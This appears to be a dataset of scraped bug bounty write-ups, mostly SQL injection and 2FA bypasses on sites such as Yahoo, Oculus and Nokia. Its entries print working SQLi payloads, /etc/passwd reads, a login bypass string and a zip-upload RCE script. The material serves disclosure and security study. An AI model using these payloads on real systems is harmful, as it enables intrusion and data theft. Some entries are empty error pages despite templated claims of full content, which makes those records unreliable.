Got 'c' QUERY output : abc The script in action And the final result was In a nutshell You can achieve the goal by using the following payload as a base for your exploit xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-' Happy hacking Bugbounty SQL injection Web pentest Keep reading More > Windows authentication attacks part 2 – kerberos Kerberos authentication is one of the cores of the AD, knowing how it works facilitates the deep understanding of many attacks. Active directory Red teaming • April 28, 2020 • 84 min read Windows authentication attacks – part 1 In order to understand attacks such as Pass the hash, relaying, Kerberos attacks, one should have pretty good knowledge about the windows Authentication / Authorization process. That’s what we’re going to achieve in this series. In this part we’re discussing the different types of windows hashes and focus on the NTLM authentication process. Red teaming • April 2, 2020 • 26 min read Attacking HelpDesks Part 1: RCE Chain on DeskPro, with Bitdefender as a Case Study We decided to look at the most popular on-premise helpdesk solutions. In this article we explain how we managed to find and exploit multiple vulnerabilities that eventually lead to remote code execution (RCE) at DeskPro software utilized by thousands of organizations using Bitdefender and Freelancer Inc in a case study. No full exploit is currently available, but steps can be easily reproduced and used to build one. Web Security • March 28, 2020 • 15 min read Oh, My Kerberos! Do Not Get Kerberoasted! Part of an upcoming series trying to shed the light on attacks targeting Microsoft Kerberos implementation in Active Directory … Active directory Red teaming • April 9, 2019 • 15 min read SHAREit Multiple Vulnerabilities Enable Unrestricted Access to Adjacent Devices’ Files Two recently discovered vulnerabilities affecting SHAREit Android application <= v 4.0.38. The first one allows attacker to bypass SHAREit device authentication mechanism, and the other one enables authenticated attacker to download arbitrary files from user's device. Both vulnerabilities were reported to the vendor and patches have been released. Mobile Penetration Testing • February 25, 2019 • 17 min read [SQLi] Extracting data without knowing columns names Extracting data without knowing columns names from MYSQL < 5 or in case of WAF blacklisting sending information_schema in the request Web Security • February 9, 2019 • 7 min read Who are we RedForce is an information security consultancy firm consists of a team of experts in the offensive security field. We are a service-oriented organization specialized in offensive consultancy services . . . more Contact us Address : 5th Floor, Golden Mall, 6th Of October, Giza, Egypt. Phone : +20 100 7842 224 Email : [email protected] Redforce © Copyright 2025. All rights reserved."}
{"source_url": "https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/", "title": "Yahoo – Root Access SQL Injection – tw.yahoo.com | ziot", "friendly_explanation": "This is a bug bounty writeup from https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nYahoo – Root Access SQL Injection – tw.yahoo.com | ziot Menu Skip to content BLOG RESUME TWITTER < Back Yahoo – Root Access SQL Injection – tw.yahoo.com January 15, 2015 February 25, 2024 I'll keep this one simple and sweet because anyone reading this blog probably knows what SQL Injection is. I discovered a root access SQL injection on tw.yahoo.com. The vulnerability here is an old TW Yahoo page that delivers json content based on an ID specified. Legitimate URL: https://tw.stock.yahoo.com/q/getjson.php?s=22301 Return: {\"id\":\"22301\",\"type\":\"stock\",\"relation\":[]} After messing with the s request variable , I noticed that it was not typecasted as integer and allowed any special character. First I checked special characters such as a single-quote - it allowed special characters, but it did not cause any server-side errors. A trick that I have picked up over the years is that sometimes websites will accidentally double decode user input. By passing in the value %2527, it would decode into % and 27, and decode an additional time into a single-quote. The problem is that they were stripping single quotes after the first decode and not the second. This allows all special characters unescaped in the SQL query, including an unescaped single-quote. Full injection URL: https://tw.stock.yahoo.com/q/getjson.php?s=%2527 union select user(),schema(),4,5,6,7,%25278 Return: {\"id\":\"' union select user(),schema(),4,5,6,7,'8\",\"type\":\"stock\",\"relation\":[{\"id\":\"root@localhost\",\"[redacted]\":\"Quote\",\"ud\":\"7\"}]} With root select access to a database, you can pull any information you want including the MySQL user password hashes. I opted not to check what databases it had access to in case it contained sensitive information. Reported on: 6/15/2014 Validated the fix: 6/19/2014"}
{"source_url": "https://medium.com/@agrawalsmart7/sql-is-every-where-5cba6ae9480a", "title": "SQLi is everywhere.. Hi, | by Utkarsh Agrawal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@agrawalsmart7/sql-is-every-where-5cba6ae9480a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQLi is everywhere.. Hi, | by Utkarsh Agrawal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Utkarsh Agrawal 2 min read · Nov 16, 2017 -- Listen Share SQLi is everywhere. Hi, This is my first blog post so I am very excited to share this. This is the story of 3 SQL injection which i found on a program. I am not taken name of that instead let’s say “abc.com” domain. So as proceed with my first step to collecting the url’s of abc.com domain. So I started digging and collect hundred of urls. And then i started to see if i get some interesting one. And yes, I found a very interesting url which contains a lot of parameters. Something like this. “ http://abc.com/file.php?ref=-3&uploader=plupload&single=&local=&search=&offset=0&order_by=relevance&sort=DESC&archive=0&collection=&metadatatemplate=&relateto=&redirecturl=” Now I was very curious to test this URL because more params more opportunities. My first test case is always “XSS” (Developer most of the time forgot to sanitize all the input parameters.). So i started digging for XSS but failed. Now I move on to the SQL by injecting the single quote (‘) to each of the parameter and one parameter i found that is vulnerable to the SQL injection and i.e. sort=DESC. When i inject single quote to that parameter and luckily i got the SQL syntax error with leaking the database name and version no. Then I was like I quickly submitted that bug to the team. And then i took a deep breath and sit aside. Next day, again i started to check the all the url which are found yesterday to test some other vulnerabilities but wait a minute. There is a POST request for edit the profile, and When we click the submit button the POST request contains post parameter and in these i found interesting parameter “resource_type=2\" So i submitted single quote to that, again i found beautiful SQL syntax error. (Off course this was not the case for XSS and any other.) One last, On that request i saw that there is a same parameter which i found first i.e. sort=DESC in the cookie section, so i was pretty sure that this is also be vulnerable and Yes it is. So i submitted all 3 SQL bugs to that company. I didn’t sleep full night, Excitement ;), And quickly i got triage and Resolved Reputation. But No rewards, they notified “At this time we are not award any bounties and cash rewards” on the Report policy as i know. But I will never forget that awesome feeling when i found. But anyways through this experience, We should agree that “Web application always have some vulnerabilities so you are need to find them which are hidden behind the curtains.” Thank you. Hope you liked it. Tweet me @agrawalsmart7 Sql Sql Injection Bug Bounty Bugs -- -- Written by Utkarsh Agrawal 205 followers · 30 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/", "title": "Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMagix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) | RCE Security Home About Contact Us Services Research Select Page Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) by Julien Ahrens | Saturday, April 26, 2014 | Advisory | 0 comments The German Magix Software GmbH rewarded me with a Hall of Fame listing and a free Magix Music Maker 2014 Premium license for my reports of several serious security issues in the online infrastructures of magix.com and xara.com, which could be used to break both sites entirely: At this point, I’d like to thank the Magix Security Team for their really fast and always transparent responses and the good coordination process as a whole. This is a perfect example of how the communication between the bug bounty operator and the researcher can satisfy both parties. The fixes for the critical vulnerabilities (RCE, SQLi, LFI) were implemented quite fast within only a few days after my initial report (!) , the fix for the XSS took a bit longer, but it’s still acceptable for a medium-severity issue. Bug Bounty programs are always a great challenge and sometimes you’re rewarded with pretty cool stuff and great references like this – now here’s a short write-up about the discovered vulnerabilities, which already have been fixed by Magix. Remote Code Execution on europe.magix.com This is the most dangerous flaw, I’ve found while working on this bug bounty program. I’ve discovered a script, that allows an attacker to upload zip files via a HTTP POST request. The script accepts any zip file, renames it to some temporary name and finally extracts the .zip file to a worker directory without checking if the zip file contains a valid file. Additionally, the extracted contents were accessible via www – I think the problem is quite obvious. To prove the exploitability to Magix, I wrote a short Python script. The following snippet shows how the quite handy Python ZipFile function can be used to dynamically generate a zip file in memory. The .zip file contains one single file named “/tmp/test.php” with a custom PHP payload. #!/usr/bin/python import zipfile from StringIO import StringIO import zlib inMemoryFile = StringIO() zipFile = zipfile.ZipFile(inMemoryFile, 'w', zipfile.ZIP_DEFLATED) zipFile.writestr('./tmp/test.php', '<?php echo \\\"www.rcesecurity.com\\\"; ?>') zipFile.close() In case of Magix, the target script echoes some additional (and hazardous) debugging output after POSTing an arbitrary zip file: looks like Magix missed to deactivate this output – without this I wouldn’t have probably found this flaw 🙂 Since the debugging output also discloses the full-path of the extracted file, this leads to a nice RCE condition: Now imagine an attacker who’d upload some malicious C99… SQL Injection on europe.magix.com This vulnerability is more or less based on the same condition like the previously described RCE flaw. If the zip file contains a specially prepared .ini file, the same script, that is responsible for the RCE flaw, uses the .ini values unfiletered in a SQL query: Local File Inclusion on downloadsv9.xara.com A local file inclusion could become as dangerous as a RCE flaw, because an attacker may read sensitive system files like /etc/passwd: …and if you’ve got a lazy sysadmin who likes to chmod 777 on files and directories, even more might by revealed 😉 Cross-Site Scripting on downloadsv9.xara.com OK – I promised not to write about a XSS in detail anymore, so I’ll leave you with the PoC screenshot: A real happy day for bug bounty hunters and Magix! X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://zombiehelp54.blogspot.com/2017/02/sql-injection-in-update-query-bug.html", "title": "Mahmoud Gamal", "friendly_explanation": "This is a bug bounty writeup from https://zombiehelp54.blogspot.com/2017/02/sql-injection-in-update-query-bug.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMahmoud Gamal Skip to main content Search This Blog Mahmoud Gamal Sorry, the page you were looking for in this blog does not exist. Powered by Blogger Theme images by Michael Elkan Mahmoud Gamal Visit profile Report Abuse"}
{"source_url": "https://bitquark.co.uk/blog/2014/02/23/tesla_motors_blind_sql_injection", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://bitquark.co.uk/blog/2014/02/23/tesla_motors_blind_sql_injection. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHi! I'm on: Bluesky Mastodon GitHub - bitquark"}
{"source_url": "https://josipfranjkovic.blogspot.com/2014/09/step-by-step-exploiting-sql-injection.html", "title": "Josip Franjković - archived security blog: Step-by-step: exploiting SQL injection(s) in Oculus' website.", "friendly_explanation": "This is a bug bounty writeup from https://josipfranjkovic.blogspot.com/2014/09/step-by-step-exploiting-sql-injection.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nJosip Franjković - archived security blog: Step-by-step: exploiting SQL injection(s) in Oculus' website. Josip Franjković - archived security blog Friday, 5 September 2014 Step-by-step: exploiting SQL injection(s) in Oculus' website. Hello, Some time ago Jon of Bitquark tweeted that he found a SQL injection and RCE in one of Facebook's acquisitions. You can find Jon's blog about the RCE vulnerability here . I guessed it was Oculus' website and started looking for more SQL injections and other vulnerabilities, resulting in a total of 5 SQL injections and a couple smaller vulnerabilities. Of those 5 injections, two were duplicate. I am not going to write about all 5 of them, but the one I have exploited to gain administrator user: SQL injection in developer.oculusvr.com/core/CompanyAction.php A POST parameter \"Domain\" was vulnerable to SQL injection, but there were few problems that made exploitation harder. Problem one: Syntax error was needed to differentiate true from false. The usual 'and'a'='a did not work and I needed to get syntax error for false. Lets build the basic true/false check: Domain='and (select 1 union select case when (1)=1 then 1 else 2 end) and '@test.com So, when 1=1 then the subquery looks like (select 1 union select 1) which is a valid query. Now, for 2=1 the subquery would be (select 1 union select 2) and it is an error, because subquery returns more than one row. We have the basic idea for true/false responses now. Problem two: No whitespaces. Oculus' domain filter required domain not to have whitespaces. Lets change the query to bypass this. I have decided to go with combination of comments /**/ and parenthesis. So: Domain='and(select(1)union(select(case/**/when(1)=1/**/then/**/1/**/else/**/2/**/end)))and'@test.com Great, this works too! Problem three: No commas. This one is a bit tricky. For blind injection we generally need LIMIT, substr() and other functions that need a comma. Well, they actually do not. After going through MySQL docs I saw comma-less syntax is possible for both LIMIT and substr(): LIMIT 0,1 is same as LIMIT 1 OFFSET 0 substr('Hello',1,1) can be used as substr('Hello' from 1 for 1). Here is the query to get database column name - character by character: 'and(select(1)union(select(case/**/when((select/**/ascii(substr(column_name/**/from/**/1/**/for/**/1))/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'xxxxxxxxxxxxxxx'/**/limit/**/1/**/offset/**/0))=97/**/then(1)else(2)end)))and'@test.com I have guessed the table name, and parts of column names for sessions table using LIKE and a bit of luck. Problem four: it is blind injection, therefore slow. I did not use sqlmap for this, but I did help myself with Burp's Intruder. Since the goal was admin's PHPSESSID and it is [0-9][a-z], I simply set Intruder to bruteforce using that character set until it finds a true response, and then manually took out the characters and assembled a PHPSESSID. It was still slow, but okay - around 10 minutes on average to get the whole 26 characters long string. It would be faster but I actually needed to do another request to see if response is true/false - you'd first get 302 redirected, then see the response. Because of this I had to use one thread only and a small delay between requests, around 0.3 seconds. Using the PHPSESSID I logged in to admin panel. Jon's way to get command execution still worked, the panel was also vulnerable to more SQL injections. I have started reporting all those, but was asked to log out - which I did. I have also tried to get RCE using file-uploads, but as far as I know it did not work. That is all folks, thanks for reading :-). I would like to thank Jon of Bitquark for sharing knowledge, Oculus for not using prepared statements, and Facebook for running the bounty program. The vulnerabilities were fixed in a few days. Oh yeah, most of this stuff I learned with/from a CTF team - you can find their blog here and their security challenges here . Posted by Josip Franjković at 01:16 Email This BlogThis! Share to X Share to Facebook Share to Pinterest No comments: Post a Comment Note: only a member of this blog may post a comment. Newer Post Older Post Home Subscribe to: Post Comments (Atom) About me I enjoy breaking websites. Contact: josip[dot]franjkovic[at]gmail[dot]com You can follow me on Twitter ! New blog: josipfranjkovic.com Blog Archive ► 2016 (1) ► July (1) ► 2015 (2) ► July (1) ► April (1) ▼ 2014 (2) ► December (1) ▼ September (1) Step-by-step: exploiting SQL injection(s) in Oculu... ► 2013 (4) ► November (1) ► July (2) ► January (1) Simple theme. Powered by Blogger ."}
{"source_url": "https://jspin.re/fileupload-blind-sqli/", "title": "Blind (time-based) SQLi - Bug Bounty", "friendly_explanation": "This is a bug bounty writeup from https://jspin.re/fileupload-blind-sqli/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBlind (time-based) SQLi - Bug Bounty Home Subscribe Blind (time-based) SQLi - Bug Bounty jspin Jul 5, 2019 • 3 min read This will be a short blog post and the first writing about Bug Bounties, I'm trying to get more involved into this matter and I'm hunting on my spare time and 90% of the time on Synack . Early this month I got invited to a private bug bounty program running on HackerOne and for obvious reasons I'll not name the company here. As soon I got invited to the program I asked some friends that were into this very same program before myself if they knew some \"fishy\" areas in the application that they were willing to share with me, well this is what friends are for. :) Talking to https://twitter.com/reefbr he sent me a self-register page in a critical domain (in-scope). The registration went through without any problem and a few seconds after hit the send button I got an email with the access details. With my self-registered user working good it was very quick to found a file upload feature within the application. File Uploads functions are straightforward so I tried to upload a random file to see if any security control was in place by the application. The limitations that I found were: PDF files accept only AV running on the backend server After poking around the upload function, I realise that the application was only validating the file type extension, such as \" filename .pdf \". I did several tries to bypass this validation and I got success in some, but in the end I did not reach any execution in the server-side, time to change the strategy. Back in the past, when doing my official daily duties as a Penetration Tester I came across a web application that was including the filename into the database, as far I remember that time I got a Blind (time-based) SQL Injection in the filename parameter . So, why not test in this application? Burp Proxy set to intercept the HTTP requests, then I hit the Upload button in the application and replace the original filename parameter to: Note: I tried to send the request without the .pdf extension but the application was rejecting. BTW, this is the same payload used by the Burp Scanner for active tests. The application was running \"behind\" the Cloudflare WAF, so after some tries to confirm if the application was vulnerable all my requests were getting the \"Access Denied\" message. Now it's time to bring back https://twitter.com/reefbr , Manoel had reported a Cloudflare bypass to the same program and again... he told me about this. Using the bypass (configuration issue) found by @reefbr I did manage to confirm the SQL Injection (finally). Talk is cheap show me the PoC. Initial request bellow: Let's increase the sleeping time... Going up a bit on the sleeping time: Let's make sure that the triage team will understand and be able to reproduce, so +1 request... That's all folks, hope you did enjoy. As a final note, this private program is handling very sensitive information (PII) so extracting any data would create new issues to the program's owner. Having this in mind, I choose to proceed with the exploitation process by using the sleep payload and comparing the responses time to proof the vulnerability. Timeline: Report Sent Report Triaged Report Solved (bug fixed) Bounty Paid Sign up for more like this. Enter your email Subscribe Variant Cloud Analysis Another yet quick blog post. A few years ago, 3 or 4, maybe 5, I was \"working\" with @marcioalm in a \"Simple Web Vulnerability Scanner\" tool intended to be part of an automation vulnerability check for a large and specific environment. Keep in mind that adventure was before the release jspin May 18, 2022 • 3 min read JBoss EAP/AS <= 6.* RCE - A little bit beyond \\xAC\\xED Time to \"leak\" this old (but gold) pre-auth RCE affecting some of the Red Hat products. As stated by @joaomatosf this is an old but gold vulnerability found by himself and shared in two distinct security conference in Brazil, this vulnerability was part of a training he gave alongside with jspin Apr 21, 2022 • 3 min read RSA Authentication Manager 8.4 Privilege Escalation Some time ago, many months ago to be accurate, during an engagement I found a way to gain root privileges in a RSA Authentication Manager server. It started from a non-authenticated point-of-view, by exploiting a Weblogic RCE vulnerability (CVE-2019-2725) which at the time, the fix was already available. BTW many jspin Aug 25, 2021 • 3 min read jspin.re - Keep hacking! © 2025 Powered by Ghost"}
{"source_url": "https://medium.com/@ultranoob/weird-and-simple-2fa-bypass-without-any-test-b869e09ac261", "title": "WEIRD 2FA BYPASS. Hi everyone,\nToday, I would like to… | by ultranoob | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ultranoob/weird-and-simple-2fa-bypass-without-any-test-b869e09ac261. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWEIRD 2FA BYPASS. Hi everyone, Today, I would like to… | by ultranoob | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in WEIRD 2FA BYPASS ultranoob 2 min read · Dec 9, 2019 -- 2 Listen Share Hi everyone, Today, I would like to talk about a weird vulnerability which I found on a private program that allowed me to bypass their 2FA protection without any test. Pardon me if there are any mistakes as this is my first write-up.! So let’s get started! Introduction: Whenever i start my hunting on any bug bounty program at first, i use the application as a normal user. It allows me to understand how the application’s workflow. And let me understand which features can be interesting to test. I noticed that the application had a 2FA ( Two Factor Authentication) feature, I enabled it and I started to play with it. As soon as i enabled it, I noticed that it was a Time-based One Time Password 2FA. Like after every 30 seconds the OTP was changing inside the Google Authenticator app. But i was provided some backup codes in case i don’t have access to my device for TOTP. Now that was something interesting. Damnn!!! Bypass: So while playing around the application, I enabled the 2FA. After enabling 2FA, i got some backup codes in case i don’t have access to my device for the TOTP. I have noted all the backup codes. The backup codes were of 8 digits. I logged out of the application to test the 2fa. :P So after entering the email address and password. I was asked to enter the TOTP. But there was option to login to the application using the backup codes. I clicked on it. And intentionally, put a random 8 digit number instead of that 8 digit backup code and to my surprise, it was accepted and i was successfully logged in to the application! In short, there was no validation for the backup code. They were not validated and hence any random 8 digit would work. Yayyy!!!! It was weird to me but i knew it’s a security bug. :D :D Takeaway: Sometimes, you don’t need any tools to find valid bug. It’s just about having positive mindset while looking for loopholes. Understand the application workflow and try looking for issues which would affect the functionality of the application. Always think like a proton. Expect the UnExpected!! Timeline: December 5, 2019 — Initial Report December 6, 2019 — Report Triaged December 6, 2019 — Bounty awarded December 8, 2019 — Bug Fixed I hope you enjoyed this reading ! Happy Hacking! Thank you! ~Ultranoob ( https://twitter.com/u1tran00b ) Security Bug Bounty Infosec Infosecurity Hacking -- -- 2 Written by ultranoob 81 followers · 2 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@jeppe.b.weikop/2fa-bypass-via-logical-rate-limiting-bypass-25ae2a4e1835", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jeppe.b.weikop/2fa-bypass-via-logical-rate-limiting-bypass-25ae2a4e1835. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://josipfranjkovic.blogspot.com/2013/07/sql-injections-in-nokia-sites.html", "title": "Josip Franjković - archived security blog: SQL injections in Nokia sites.", "friendly_explanation": "This is a bug bounty writeup from https://josipfranjkovic.blogspot.com/2013/07/sql-injections-in-nokia-sites.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nJosip Franjković - archived security blog: SQL injections in Nokia sites. Josip Franjković - archived security blog Tuesday, 30 July 2013 SQL injections in Nokia sites. Hello, I have found out about Nokia security reward program somewhere mid-April. Reports of people getting one or more mobile phones made me interested and I started searching for bugs. As usual XSS/CSRF did not bring people real reward (only Hall of Fame), I started looking for SQL injections (and SQL injections only). In one week I have found total of 4 SQL injections in their sites, but will write about three of them as fourth one is fairly similar to one of these three. So: SQL injection in www4.nokia.de Found this site using Google. The actual vulnerable link was: http://www4.nokia.de/storelocator/ Vulnerable variable is the User-Agent header , there was no response on page except for blank or load, so it was blind SQL injection . The query behind was INSERT INTO, MySQL was the database. So, how do you exploit something like INSERT INTO table(a,b,c)VALUES(1,2,'$user_agent') if there is no error reporting, and you cannot see output from the database? After trying to make valid PoC for 10 minutes, I did not know what to do. So, I asked one of my old friends, Bryan de Houwer . Few minutes later, he said \" Hey, did you try inserting into multiple rows? \"... I forgot that, for some reason. You could do something like INSERT INTO table(a,b,c)VALUES(1,2,3),(4,5,6); Great! After some brute-forcing, I found out the INSERT query had 5 columns. Setting my User-Agent to ',1,1),(1,2,3,4,5)-- - The site loaded, meaning the query worked. Now, you cannot use usual AND 3=23 in INSERT queries, as INSERT INTO a(b)VALUES(1 and 3=23); is a valid query, and it will go through - meaning I cannot get any data. I needed some way to trigger error for true/false. Now what? One of my favorite blind SQL injection tricks is to make the database return multiple rows in a subquery . For example, SELECT a,(select b from table) from table; will return \"Subquery returns more than 1 row\" - if there is more than one row, of course. Now, I used the UNION keyword to do the trick for me: SELECT 1 UNION SELECT 2; -> \"Subquery returns more than 1 row\"; with a CASE statement, my final injection looked like: User-Agent: ',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)= 5 ) then 1 else 2 end))-- - The page loads. User-Agent: ',1,1),(1,2,3,4,(select 1 union select case when(substr(version(),1,1)= 4 ) then 1 else 2 end))-- - Blank. See the change in version. Time-line: 22. April 2013 - Vulnerability reported. 22. April 2013 - Response from Nokia Team 23. April 2013 - Vulnerability fixed (That was pretty fast!) SQL injection in *********** URL is hidden for now, as there is still one unpatched vulnerability. As soon as it gets patched, I am publishing it. Found this site using ********** This is a PHP site from <2005. I think this told you enough. Login using User: ' or 'x'='x Pass: 'or 'x'='x From there, pretty much every SINGLE... well, everything was vulnerable to SQL injection. The DB was PostgreSQL. Error reporting was on. Multiple queries, DROP/CREATE privileges, much like connecting to your database and sending your own queries. Time-line: 23. April 2013 - Reported 23. April 2013 - Reply from Nokia Team 25. April 2013 - Fixed (took them some time to find login details). Gotta love old, forgotten sites. Nokia.es subdomain SQL injection Got no idea how I found this one. The injection is blind, time based. PICTURES! True: False: Conclusion: Fourth SQL injection is almost the same as first. Nokia fixed those bugs really fast. I was awarded a single Nokia Lumia 820 (yellow color, looks great and is an amazing phone) and the Top Reporter status for April. Although those vulnerabilities were found in short time frame, and I was not really working my ass off, I have expected at least a Lumia 920 or another Lumia 820 - I know of people who got multiple phones for XSS/CSRF in similar domains. I would like to thank the Nokia Incident Response Team for their quick fixes, and Bryan de Houwer for reminding me of multiple inserts in SQL. Posted by Josip Franjković at 16:58 Email This BlogThis! Share to X Share to Facebook Share to Pinterest No comments: Post a Comment Note: only a member of this blog may post a comment. Newer Post Older Post Home Subscribe to: Post Comments (Atom) About me I enjoy breaking websites. Contact: josip[dot]franjkovic[at]gmail[dot]com You can follow me on Twitter ! New blog: josipfranjkovic.com Blog Archive ► 2016 (1) ► July (1) ► 2015 (2) ► July (1) ► April (1) ► 2014 (2) ► December (1) ► September (1) ▼ 2013 (4) ► November (1) ▼ July (2) SQL injections in Nokia sites. How I found my way into Instagram's Ganglia, and a... ► January (1) Simple theme. Powered by Blogger ."}
{"source_url": "https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2", "title": "SQL injection with load file and into outfile | by Kswari | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL injection with load file and into outfile | by Kswari | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication SQL injection with load file and into outfile Kswari 2 min read · Feb 5, 2018 -- 8 Listen Share Well this submission make me get the patient badge on h1 coz it’s more then 6 month (1 year) hehehehehe. I got sqli vulnerability when test with apostrophe (‘). Sorry for the redacted guys. 😛 I do register as affiliate on the web as usual. Press enter or click to view image in full size Then got redirect to POST all form information here https://www.blablabla.com/svc/*****/form_affiliate . Select it and send to repeater. The vulnerable parameter is email . Press enter or click to view image in full size On request box, i input this SQL command in “ email ” parameter ‘ and 1=2 union all select concat_ws(0x3a,version(),user(),database()) — and click Go (this command will show version, user and database name) Press enter or click to view image in full size The result is shown on response box “ 5.5.41-log:root@10.130.*.**:tp_cart ”. Now i try to change the SQL command with this load file command ‘ and 1=2 union all select load_file(‘/etc/passwd’) and boom! got the passwd. Press enter or click to view image in full size Change the load file command with into outfile command to create a file on /tmp ‘ and 1=2 union all select ‘blablabla_bug_bounty_program’ into outfile ‘/tmp/blablabla’ — that command means write blablabla_bug_bounty_program into blablabla file on /tmp directory. Press enter or click to view image in full size Now i use load file again to see the file is created or not using this command ‘ and 1=2 union all select load_file(‘/tmp/blablabla’) Press enter or click to view image in full size And it’s created successfully! So i got sqli and also can create a file on the server. Happy hacking guys! 😃 Sql Bug Bounty Vulnerability Sql Injection -- -- 8 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Kswari 1K followers · 41 following Research & OSINT Responses ( 8 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3", "title": "Bypass 2FA in a website. It was first day of 2020. I found a way… | by Sourav Sahana | Sourav Sahana | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypass 2FA in a website. It was first day of 2020. I found a way… | by Sourav Sahana | Sourav Sahana | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Sourav Sahana · Bug bounty writeups Bypass 2FA in a website Sourav Sahana 1 min read · Jan 9, 2020 -- 3 Listen Share 01.01.2020 Hii hunters ! I’m again with another story. I love 2FA, not because it provide extra security. Because of satisfaction to bypass them. Stay tuned with me because I’ll post more story on 2FA bypass. Enjoy the story !! It was first day of 2020. I found a way to bypass 2fa in a website. I was randomly searching bug bounty program with GHDB. And found a domain that is allowing users to enable 2fa with google authentication app. Challenge accepted… First I tried in login page. Tries every possible way but didn’t get any success. Then I thought lets look at the forget password page, I Entered my email ID and and clicked on ‘forgot password’ . After few seconds I got an email that looks like this: https://app.domain .io/reset/645hNr78tr5410HgG6yvYZtk2Y 45lki7/ I visited the url and entered a new password. After clicking submit, a new window opened that asking me 2FA code. So I first tried with response manipulation. But didn’t work. Then I looked at the request to see what was going on with my 2fa code. That was a POST request and in the body I found ‘ reset_key ’, ‘ _csrf ’, ‘ email ’, ‘ password ’ and ‘ token ’ parameters. ‘token’ is my 2FA code. I deleted token parameter and it’s value. Then I forwarded the request. And BOOM… I was redirected in my account with a notification : “Password successfully changed” . I was like… Thank you for your time. Hope you enjoyed this story. Happy Hunting.!! Sourav Sahana Hacking Bug Bounty Writeup Infosec -- -- 3 Published in Sourav Sahana 272 followers · Last published Feb 12, 2020 Bug bounty writeups Written by Sourav Sahana 293 followers · 2 following Hey ! My name is Sourav and I’m a security researcher/Hacker from India. Follow me if you are bug hunter to see my findings. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4", "title": "BugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!! 😎 | by Akash Agrawal | devopsenthusiasm | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!! 😎 | by Akash Agrawal | devopsenthusiasm | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in devopsenthusiasm · devopsenthusiasm BugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!! 😎 Akash Agrawal 3 min read · Nov 8, 2019 -- 2 Listen Share Today I would like to share how I was able to bypass OTP (One Time Password) login with a simple brute force attack on India’s biggest travel service provider. OTP is treated as an additional measure for security termed as 2FA. For those who don't know about, what is 2FA? Two-factor authentication (2FA) , sometimes referred to as two-step verification or dual factor authentication, is a security process in which the user provides two different authentication factors to verify themselves to better protect both the user’s credentials and the resources the user can access. Generally, OTP is 